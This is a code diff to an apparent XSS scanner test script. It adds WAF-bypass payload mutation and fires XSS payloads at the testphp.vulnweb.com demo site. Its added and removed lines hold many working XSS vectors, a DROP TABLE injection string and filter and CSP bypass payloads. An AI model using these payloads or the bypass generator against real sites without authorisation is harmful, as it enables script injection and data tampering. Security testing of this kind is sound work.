@@ -14,12 +14,14 @@ import json
 import requests
 from datetime import datetime
 import urllib.parse
+import random
 
 # Add the project directory to the path
 sys.path.insert(0, os.path.abspath(os.path.dirname(__file__)))
 
 # Import required components
 from core_scanner.advanced_xss_detector import AdvancedXSSDetector
+from core_scanner.waf_bypass import WAFBypass
 
 # Setup logging
 logging.basicConfig(
@@ -173,9 +175,62 @@ def test_specific_paths(base_url, detector):
     
     return all_results
 
+def test_with_waf_bypass(base_payload, target_url, detector, waf_bypass):
+    """
+    Test a payload with WAF bypass variations.
+    
+    Args:
+        base_payload (str): Original payload to test
+        target_url (str): Target URL
+        detector (AdvancedXSSDetector): XSS detector instance
+        waf_bypass (WAFBypass): WAF bypass module instance
+        
+    Returns:
+        dict: Test results
+    """
+    logger.info(f"Testing WAF bypass variations for payload: {base_payload[:30]}...")
+    
+    # Generate WAF bypass variations
+    bypass_variations = waf_bypass.generate_waf_bypass_payloads(base_payload, max_variations=3)
+    
+    results = {
+        'base_payload': base_payload,
+        'variations_tested': len(bypass_variations),
+        'successful_bypasses': 0,
+        'results': []
+    }
+    
+    # Test each variation
+    for variation in bypass_variations:
+        mutated_payload = variation['mutated']
+        technique = variation['technique']
+        
+        # Create test URL with the mutated payload
+        test_url = f"{target_url}?searchFor={urllib.parse.quote(mutated_payload)}"
+        response = fetch_url(test_url)
+        
+        # Analyze the response
+        analysis = detector.analyze_response(test_url, response)
+        
+        # Check if payload was successful
+        reflection_points = analysis.get('reflection_points', [])
+        has_reflection = any('parameter' in point and point.get('value', '') == mutated_payload for point in reflection_points)
+        
+        if has_reflection:
+            results['successful_bypasses'] += 1
+        
+        results['results'].append({
+            'technique': technique,
+            'payload': mutated_payload,
+            'reflection_detected': has_reflection,
+            'risk_level': analysis.get('risk_level', 'unknown')
+        })
+    
+    return results
+
 def main():
     """Main function to run the test."""
-    # Initialize the detector
+    # Initialize the detector and WAF bypass module
     config = {
         'max_detection_depth': 3,
         'enable_machine_learning': False,
@@ -183,66 +238,59 @@ def main():
         'analyze_dom': True
     }
     detector = AdvancedXSSDetector(config)
+    waf_bypass = WAFBypass()
     
     # Target vulnerable URL
     target_url = "http://testphp.vulnweb.com"
     
-    # Define manual payloads for testing - comprehensive collection of XSS vectors
-    manual_payloads = [
-        # Basic payloads
+    # Define base payloads for testing
+    base_payloads = [
+        # Basic payload
         "<script>alert('XSS')</script>",
+        # Image based payload
         "<img src=x onerror=alert('XSS')>",
-        "<svg onload=alert('XSS')>",
-        
+        # Event handler
+        "<body onload=alert('XSS')>"
+    ]
+    
+    # Generate WAF bypass variations for the payloads
+    waf_bypass_payloads = []
+    for base_payload in base_payloads:
+        bypass_variations = waf_bypass.generate_waf_bypass_payloads(base_payload)
+        waf_bypass_payloads.extend([var['mutated'] for var in bypass_variations])
+    
+    # Select some additional standard payloads
+    standard_payloads = [
         # SQL Injection combined with XSS
         "' OR 1=1; <script>alert('XSS')</script>",
-        "1'; DROP TABLE users; <script>alert('XSS')</script>--",
         
         # JavaScript string termination attacks
         "';alert('XSS');//",
-        "\";alert('XSS');//",
-        
-        # DOM-based payloads
-        "<script>document.write('<img src=\"x\" onerror=\"alert(\'XSS\')\">')</script>",
-        "<script>eval(location.hash.slice(1))</script>#alert('XSS')",
         
         # HTML5 vectors
         "<iframe src='javascript:alert(1)'></iframe>",
-        "<video><source onerror=\"javascript:alert('XSS')\">",
-        "<audio src=x onerror=alert('XSS')>",
         
         # Event handlers
-        "<body onload=alert('XSS')>",
         "<input autofocus onfocus=alert('XSS')>",
-        "<details open ontoggle=alert('XSS')>",
-        
-        # Exotic vectors
-        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert('XSS')>",
-        "<noscript><p title=\"</noscript><img src=x onerror=alert('XSS')\">",
         
         # Encoding bypasses
-        "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;",
-        "<script>\\u0061lert('XSS')</script>",
-        
-        # Filter bypass techniques
-        "<ScRiPt>alert('XSS')</ScRiPt>",
-        "<IMG SRC=JaVaScRiPt:alert('XSS')>",
-        "<script>a=alert;a('XSS');</script>",
-        
-        # CSP bypass attempts
-        "<script nonce=abc>alert('XSS')</script>",
-        "<script src=\"data:text/javascript,alert('XSS')\"></script>",
-        
-        # AngularJS vectors (common in modern web apps)
-        "{{constructor.constructor('alert(\"XSS\")')()}}",
-        "<div ng-app ng-csp>{{$eval.constructor('alert(\"XSS\")')()}}</div>"
+        "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;"
     ]
     
-    # Use manual payloads for testing
-    payloads = manual_payloads
+    # Combine all payloads, limiting to keep test duration reasonable
+    all_payloads = waf_bypass_payloads + standard_payloads
+    payloads = random.sample(all_payloads, min(15, len(all_payloads)))
     
-    # Run the test with payloads
+    # Run the test with generated payloads
     results = test_url_with_payloads(target_url, payloads, detector)
+    
+    # Test WAF bypass specifically
+    waf_bypass_results = []
+    for base_payload in base_payloads:
+        result = test_with_waf_bypass(base_payload, target_url, detector, waf_bypass)
+        waf_bypass_results.append(result)
+    
+    results['waf_bypass_results'] = waf_bypass_results
     
     # Test specific vulnerable paths
     path_results = test_specific_paths(target_url, detector)
@@ -254,6 +302,21 @@ def main():
     print(f"Tests Run: {results['tests_run']}")
     print(f"Potential Vulnerabilities Found: {results['vulnerabilities_found']}")
     print(f"Risk Level: {results.get('base_analysis', {}).get('risk_level', 'unknown')}")
+    
+    # Print WAF bypass results
+    print("\n==== WAF BYPASS RESULTS ====")
+    for i, bypass_result in enumerate(results.get('waf_bypass_results', [])):
+        print(f"\n[Test {i+1}] Base Payload: {bypass_result['base_payload']}")
+        print(f"Variations Tested: {bypass_result['variations_tested']}")
+        print(f"Successful Bypasses: {bypass_result['successful_bypasses']}")
+        
+        # Show some of the successful bypass techniques if any
+        if bypass_result['successful_bypasses'] > 0:
+            print("\nSuccessful Bypass Techniques:")
+            for result in bypass_result['results']:
+                if result.get('reflection_detected'):
+                    print(f"  - Technique: {result['technique']}")
+                    print(f"    Payload: {result['payload'][:50]}..." if len(result['payload']) > 50 else f"    Payload: {result['payload']}")
     
     # Print vulnerability details if found
     if results['vulnerabilities_found'] > 0:
@@ -291,6 +354,15 @@ def main():
     if 'recommendation' in results.get('base_analysis', {}):
         print("\n==== RECOMMENDATIONS ====")
         print(results['base_analysis']['recommendation'])
+        
+    # Add WAF bypass specific recommendations
+    print("\n==== WAF BYPASS RECOMMENDATIONS ====")
+    print("Based on the WAF bypass testing, consider implementing the following:")
+    print("1. Use context-aware output encoding rather than simple filtering")
+    print("2. Implement Content Security Policy (CSP) with strict directives")
+    print("3. Use a modern WAF solution with regularly updated rules")
+    print("4. Monitor for emerging bypass techniques and update defenses accordingly")
+    print("5. Consider using a comprehensive approach combining both client and server-side protections")
     
     # Save detailed results to file
     with open('vulnweb_test_results.json', 'w') as f:
